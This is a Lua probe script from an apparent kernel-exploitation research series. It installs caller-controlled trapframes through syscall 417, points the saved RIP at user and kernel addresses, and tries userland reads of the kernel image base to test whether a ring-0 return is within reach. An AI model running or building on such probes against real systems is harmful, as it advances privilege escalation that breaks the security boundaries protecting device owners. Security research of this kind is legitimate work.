-- CRASH_CLASS: MODERATE (stage C returns to a supervisor address at CPL3, which
-- is an ordinary user page fault; stage D reads a supervisor page, which the
-- loader's SIGSEGV handler may not survive)
-- PROBE 1359a: 417 installs a CALLER-CONTROLLED trapframe - prove the RIP field
-- reaches the iretq, and see what a userland read of the kernel image answers
--
-- 1358a (results/phase35_dead_end_reruns/1358a_sys417_selectors_20261109_112355.txt)
-- measured the mechanics: 421 fills a buffer with the live trapframe
-- (RIP=0x82BD44B5C CS=0x43 RFLAGS=0x202 RSP=0x311220868 SS=0x3B) and
-- 417(buffer) returned 0 and the caller kept running - so a full frame install
-- is accepted on 14.10. The next stage patched ONLY CS to 0x08 and the process
-- stopped emitting, which is what a ring-0 return looks like, but it is also
-- what a "#GP on a bad selector -> trap_fatal" looks like. Two things separate
-- the readings and both are safe to measure:
--   * is a MODIFIED frame field honoured at all (RIP -> a supervisor address at
--     CPL3 is a plain user #PF, not a kernel fault), and
--   * what does the kernel answer a userland read of its own image page.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1358a_sys417_selectors_20261109_112355.txt
--   probes/phase35_dead_end_reruns/1358a_sys417_selectors.lua
--   results/phase17_new_vectors/816a_rflags_iopl_20261026_123814.txt
--   probes/phase17_new_vectors/1166a_417_selector_control.lua (never ran)
--   results/phase17_new_vectors/424a_mmap_exec_20261022_232204.txt (no prot executes)
--   .local/loader_payload/signal.lua:1-120 (handler: 0x13371337, signo, addr, mcontext)

if _G.__p1359_ran then
    print("[!] RE-ENTRY - the installed frame resumed the old RIP. Stopping.")
    print("=== PROBE 1359a RE-ENTRY ===")
    return
end
_G.__p1359_ran = true

print("=== PROBE 1359a: 417 FRAME RIDES THE IRETQ ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function sgn(val)
    local ok, h, l = pcall(function() return val.h, val.l end)
    if ok and type(h) == "number" and type(l) == "number" then
        if l % 0x100000000 == 0xFFFFFFFF and h % 0x100000000 == 0xFFFFFFFF then return "-1" end
        return string.format("0x%X_%08X", h % 0x100000000, l % 0x100000000)
    end
    if type(val) == "number" then
        if val < 0 then return tostring(val) end
        return string.format("0x%X", val)
    end
    return tostring(val)
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function u64v(v) return uint64(string.format("0x%X", v)) end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local getpid = make_syscall(20)
local KBASE = 0xFFFFFFFFC1000000

local function alive(tag)
    print(string.format("  %s alive pid=%d", tag, to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
end

print(string.format("[0] pid=%d  kernel image base from STATE.md = 0x%X", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), KBASE))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
print(string.format("  frame=0x%X", to_num(F)))

local function readframe(tag)
    local ok, r = pcall(function() return sc421(uint64(F)) end)
    if not ok then print(string.format("  %s 421 EXC", tag)); return nil end
    local f = { rip = rdq(F + 0xE0), cs = rdq(F + 0xE8), fl = rdq(F + 0xF0), rsp = rdq(F + 0xF8), ss = rdq(F + 0x100) }
    print(string.format("  %s 421 ret=%s RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X SS=0x%X",
        tag, sgn(r), f.rip, f.cs, f.fl, f.rsp, f.ss))
    return f
end
local function install(tag)
    local ok, r = pcall(function() return sc417(u64v(to_num(F))) end)
    if not ok then print(string.format("  %s 417 EXC", tag)); return nil end
    print(string.format("  %s 417 ret=%s errno=%s", tag, sgn(r), es()))
    return sgn(r)
end

print("")
print("[A] baseline frame read (no install)")
readframe("[A]")

print("")
print("[B] install the live frame untouched - the mechanics control")
print("  calling 417 unchanged ...")
install("[B]")
alive("[B]")

print("")
print("[C] install with RIP = an UNMAPPED user page (0x10000), CS/SS untouched")
print("    a user #PF here means the frame's RIP reaches the iretq")
local f2 = readframe("[C]")
if f2 then
    if f2.cs ~= 0x43 then print("  CS is not 0x43; frame unexpected, skipping") else
        wrq(F + 0xE0, u64v(0x10000))
        print("  RIP 0x" .. string.format("%X", f2.rip) .. " -> 0x10000, calling 417 ...")
        install("[C]")
        alive("[C]")
    end
end

print("")
print("[D] install with RIP = the kernel image base (supervisor page), CS stays 0x43")
print("    same #PF path, but si_addr proves the exact value was used")
local f3 = readframe("[D]")
if f3 then
    if f3.cs ~= 0x43 then print("  CS is not 0x43; frame unexpected, skipping") else
        wrq(F + 0xE0, u64v(KBASE))
        print("  calling 417 with RIP=0x" .. string.format("%X", KBASE) .. " ...")
        install("[D]")
        alive("[D]")
    end
end

print("")
print("[E] plain userland read of the kernel image page (last: this may not survive)")
alive("[E]")
print("  reading 0x" .. string.format("%X", KBASE) .. " ...")
local v = rdq(KBASE)
if v == nil then print("  read returned nil (fault)") else print(string.format("  read = 0x%X", v)) end
local v2 = rdq(KBASE + 0x1000)
if v2 == nil then print("  KBASE+0x1000 read nil") else print(string.format("  KBASE+0x1000 = 0x%X", v2)) end

print("")
alive("[Z]")
print("=== PROBE 1359a COMPLETE ===")
